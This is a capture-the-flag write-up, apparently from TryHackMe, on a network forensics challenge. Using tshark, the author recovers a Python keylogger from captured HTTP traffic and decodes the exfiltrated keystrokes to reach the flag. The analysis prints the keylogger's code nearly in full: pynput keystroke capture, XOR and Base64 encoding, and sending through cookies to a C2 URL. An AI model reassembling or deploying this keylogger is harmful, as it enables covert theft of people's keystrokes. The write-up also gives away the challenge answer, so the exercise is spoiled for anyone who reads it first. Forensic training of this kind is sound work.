**Tags:** PCAP Analysis, Network Forensics, Cryptography.

**Difficulty:** Easy.

## 1. PCAP Analysis

In this room, we are provided with a `traffic.pcapng` file. Our task is to analyze the captured network traffic and determine what happened within it.

First, we examine the overall protocol hierarchy:

```bash
tshark -r traffic.pcapng -q -z io,phs
```

Output:

```text
===================================================================
Protocol Hierarchy Statistics
Filter:

null                                     frames:171 bytes:8588
  ip                                     frames:171 bytes:8588
    tcp                                  frames:171 bytes:8588
      data                               frames:16 bytes:928
eth                                      frames:1177 bytes:502017
  arp                                    frames:3 bytes:162
  ip                                     frames:1174 bytes:501855
    tcp                                  frames:945 bytes:398033
      http                               frames:62 bytes:37862
        media                            frames:1 bytes:1140
          tcp.segments                   frames:1 bytes:1140
        data-text-lines                  frames:30 bytes:27840
          tcp.segments                   frames:30 bytes:27840
      tls                                frames:228 bytes:133744
        tcp.segments                   frames:21 bytes:17926
          tls                            frames:4 bytes:3444
    udp                                  frames:229 bytes:103822
      ssdp                               frames:32 bytes:12920
      dns                                frames:18 bytes:2382
      quic                               frames:179 bytes:88520
        quic                             frames:7 bytes:6798
          quic                           frames:2 bytes:2584
```

HTTP traffic is particularly interesting. The PCAP contains `62` HTTP frames, so we investigate the HTTP requests further.

---

## 2. Finding HTTP Requests

To see which HTTP resources were requested by the client, we use:

```bash
tshark -r traffic.pcapng -Y http.request \
-T fields \
-e ip.src \
-e ip.dst \
-e http.host \
-e http.request.uri
```

We get:

```text
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/temp/updates.py
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/
...
```

The most interesting request is:

```text
/temp/updates.py
```

This means that the client downloads a Python file from the `byte-lotus-hotel.thm:8080` server.

---

## 3. Recovering the TCP Stream

We now need to examine the contents of the TCP connection in which `/temp/updates.py` was transferred.

We use:

```bash
tshark -r traffic.pcapng -q -z follow,tcp,ascii,5
```

This displays the contents of TCP stream #5 in ASCII format.

The result contains the HTTP request:

```text
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
```

The server responds:

```text
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed, 17 Jun 2026 05:38:38 GMT
Content-type: text/x-python
Content-Length: 1086
Last-Modified: Wed, 17 Jun 2026 05:30:02 GMT
```

The server is therefore delivering a Python script named `updates.py` to the client.

---

## 4. Analyzing the Python Script

The HTTP response contains the source code of the Python program.

The beginning of the script is:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"
```

Three important details are immediately visible:

* `pynput.keyboard` is used to capture keystrokes;
* `requests` is used to send HTTP requests;
* `C2_URL` specifies the server to which the collected data is sent.

### Encryption Key

The following function defines the key:

```python
def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2
```

It combines two strings:

```text
H0t3lSt@ff0Nly
K3epS3cr3t!
```

The resulting key is:

```text
H0t3lSt@ff0NlyK3epS3cr3t!
```

This key is later used for XOR encryption of the captured characters.

---

## 5. How the Encryption Works

The following function implements XOR:

```python
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

Each byte of the input data is XORed with the corresponding byte of the key.

The expression:

```python
key[i % len(key)]
```

means that if the data is longer than the key, the key is reused from the beginning.

In this case, each input character is first converted to UTF-8 bytes and then XORed with the key.

---

## 6. Sending Keystrokes to the C2 Server

The `sendltr()` function accepts a single character:

```python
def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
```

So:

1. The character is converted into bytes.
2. The bytes are XORed with the key.

The result is then encoded using Base64:

```python
b64_string = base64.b64encode(encrypted).decode('utf-8')
```

An HTTP header is then created:

```python
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
    "Cookie": f"hotel_sess_state={b64_string}"
}
```

Therefore, the encrypted character is not sent in the POST body, but inside an HTTP Cookie:

```text
hotel_sess_state=<Base64>
```

A GET request is then made:

```python
requests.get(C2_URL, headers=headers, timeout=0.5)
```

The script therefore implements a simple HTTP C2 channel: each captured keystroke is sent to the server as a separate HTTP request.

---

## 7. Keyboard Capture

The following function handles key presses:

```python
def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")
```

For a regular key, the following is called:

```python
sendltr(key.char)
```

The script separately handles:

* `Space` → `" "`
* `Enter` → `"\n"`

The keylogger starts here:

```python
print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

The program continuously waits for keystrokes and sends them to the C2 server.

In other words, we have discovered a **keylogger** that sends captured keystrokes over HTTP after applying XOR encryption and Base64 encoding.

---

# 8. Extracting Cookies from the PCAP

Now that we know where the data is transmitted, we extract all HTTP Cookies from the captured traffic:

```bash
tshark -r traffic.pcapng -Y "http.cookie" \
-T fields \
-e http.cookie
```

The result is a sequence of values:

```text
hotel_sess_state=HA==
hotel_sess_state=AA==
hotel_sess_state=BQ==
hotel_sess_state=Mw==
hotel_sess_state=Hg==
hotel_sess_state=ew==
hotel_sess_state=Og==
hotel_sess_state=fA==
hotel_sess_state=Fw==
hotel_sess_state=eQ==
hotel_sess_state=Ow==
hotel_sess_state=Fw==
hotel_sess_state=Pw==
hotel_sess_state=fA==
hotel_sess_state=PA==
hotel_sess_state=Kw==
hotel_sess_state=IA==
hotel_sess_state=eQ==
hotel_sess_state=Jg==
hotel_sess_state=Lw==
hotel_sess_state=Fw==
hotel_sess_state=eA==
hotel_sess_state=Pg==
hotel_sess_state=LQ==
hotel_sess_state=Gg==
hotel_sess_state=Fw==
hotel_sess_state=MQ==
hotel_sess_state=eA==
hotel_sess_state=PQ==
hotel_sess_state=NQ==
```

Each line corresponds to one transmitted character.

For example:

```text
hotel_sess_state=HA==
```

is the Base64 representation of the encrypted byte of the first character.

It is important that we cannot simply concatenate all of these Base64 strings and decode them once. Each string represents a **separate encrypted character**, so they must be processed individually.

---

# 9. Writing a Decoder

We create a Python script:

```bash
nano decode.py
```

We use the same XOR key discovered in `updates.py`:

```python
import base64

key = b"H0t3lSt@ff0NlyK3epS3cr3t!"
```

We then place all Base64 values extracted from the PCAP into the `data` variable:

```python
data = """
HA==
AA==
BQ==
Mw==
Hg==
ew==
Og==
fA==
Fw==
eQ==
Ow==
Fw==
Pw==
fA==
PA==
Kw==
IA==
eQ==
Jg==
Lw==
Fw==
eA==
Pg==
LQ==
Gg==
Fw==
MQ==
eA==
PQ==
NQ==
"""
```

Each line is then decoded from Base64:

```python
encrypted = base64.b64decode(item.strip())
```

The resulting byte is decrypted using the same XOR algorithm:

```python
decoded = bytes(
    b ^ key[i % len(key)]
    for i, b in enumerate(encrypted)
)
```

The decrypted character is added to the resulting string:

```python
result += decoded.decode()
```

Finally, we print the recovered text:

```python
print(result)
```

---

# 10. Obtaining the Flag

We run the decoder:

```bash
python3 decode.py
```

The result is:

```text
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## How It Worked

The complete process can be summarized as follows:

```text
traffic.pcapng
      │
      ▼
HTTP request
/temp/updates.py
      │
      ▼
Python keylogger
      │
      ├── captures keystrokes
      │
      ├── XOR with key
      │
      ├── Base64
      │
      ▼
HTTP Cookie
hotel_sess_state=<Base64>
      │
      ▼
PCAP
      │
      ▼
tshark extracts Cookies
      │
      ▼
Base64 decode
      │
      ▼
XOR with recovered key
      │
      ▼
original text
      │
      ▼
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

The **PCAP did not contain the flag in plain text**. We first recovered the malicious Python script from the network traffic, identified the transmission method and XOR key, then extracted the transmitted Cookies and applied the reverse `Base64 → XOR` process to recover the original text and the flag.
